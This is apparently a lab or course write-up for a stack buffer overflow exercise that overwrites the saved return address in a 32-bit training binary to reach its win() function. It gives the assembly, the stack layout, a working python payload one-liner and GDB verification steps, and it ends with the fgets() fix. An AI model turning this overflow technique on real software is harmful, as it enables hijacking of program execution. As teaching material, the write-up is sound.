# ex04 — Stack Overflow into Saved EIP (Return Address)

## Goal

Overwrite the **saved return address** (EIP) on the stack to redirect execution to `win()`:

```
code flow successfully changed
```

## Concept

This is the classic **stack buffer overflow** that every security course teaches. When a function is called, the CPU pushes the **return address** (the address of the instruction after the `call`) onto the stack. When the function finishes, it pops this address into EIP to return to the caller.

By overflowing a buffer, we can overwrite this saved return address. When the function returns, instead of going back to the caller, execution jumps to our chosen address.

### How function calls work on x86

```
call some_function:
    1. Push return address onto stack
    2. Jump to some_function

some_function:
    push ebp           ; save old base pointer
    mov  ebp, esp      ; set new base pointer
    sub  esp, N        ; allocate local variables
    ...
    leave              ; restore old base pointer
    ret                ; pop return address into EIP
```

The saved EIP sits **above** the local variables on the stack. If a buffer is overflowed, the extra bytes can reach and overwrite it.

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  Return address (4 bytes)   │  [ebp+0x4]  ← saved EIP, overwritten!
├─────────────────────────────┤
│  Saved EBP (4 bytes)        │  [ebp]      ← saved frame pointer
├─────────────────────────────┤
│  ... (padding)              │
├─────────────────────────────┤
│  buffer (64 bytes)          │  [esp+0x10] ← gets() writes here
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

The buffer is at `[esp+0x10]`. The saved EBP is at `[ebp]`, and the return address is at `[ebp+0x4]`. The offset from the buffer to the return address is **76 bytes** (64 bytes of buffer + 8 bytes of padding + 4 bytes of saved EBP).

## Relevant Assembly (`main`)

```asm
08048408 <main>:
    push   ebp
    mov    ebp, esp
    and    esp, 0xfffffff0
    sub    esp, 0x50                  ; allocate 80 bytes

    lea    eax, [esp+0x10]            ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax       ; arg1 = buffer
    call   gets                       ; gets(buffer) — NO BOUNDS CHECK

    leave                            ; mov esp, ebp; pop ebp
    ret                              ; pop EIP — REDIRECTED!
```

### The `win()` function

```asm
080483f4 <win>:
    mov    DWORD PTR [esp], 0x80484e0   ; "code flow successfully changed"
    call   puts
    ret
```

### Step-by-step analysis

| Instruction | What it does |
|---|---|
| `sub esp, 0x50` | Allocates 80 bytes for locals |
| `lea eax, [esp+0x10]` | Gets buffer address |
| `call gets` | Reads unlimited input |
| `leave` | Restores stack frame |
| `ret` | Pops return address into EIP |

## Exploit

Send 76 bytes of padding (64 buffer + 8 padding + 4 saved EBP), then the address of `win()`:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08" + b"\n")' | ./bin
```

### Why it works

- Bytes 1–64: Fill the buffer
- Bytes 65–72: Overwrite padding/unused space
- Bytes 73–76: Overwrite saved EBP
- Bytes 77–80 (`\xf4\x83\x04\x08`): Overwrite saved return address with `0x080483f4`
- When `main` executes `ret`, it pops `0x080483f4` into EIP
- Execution jumps to `win()`, which prints the success message

### Little-endian explanation

```
Memory address:  [ebp+0x4]  [ebp+0x5]  [ebp+0x6]  [ebp+0x7]
Byte value:       0xf4        0x83        0x04        0x08

As a 32-bit address (little-endian): 0x080483f4
```

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break after gets() returns
break *0x0804841d
run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08" + b"\n")')

# Check the saved return address
x/wx $ebp+0x4
# Output: 0x080483f4

# Verify it points to win()
info symbol 0x080483f4
# Output: win

# Check the stack layout
x/24xw $esp
# Shows buffer contents, saved EBP, and return address

# Set a breakpoint at win() to confirm we'll hit it
break win
continue
# Should hit the breakpoint at win()

# Continue to see success
continue
```

## Key Takeaway

This is the most fundamental binary exploitation technique. Overwriting the saved return address allows arbitrary code execution. Modern protections like **ASLR** (Address Space Layout Randomization), **stack canaries**, and **NX bit** make this harder, but the concept remains the foundation of binary exploitation. The fix is to use `fgets()` instead of `gets()`.
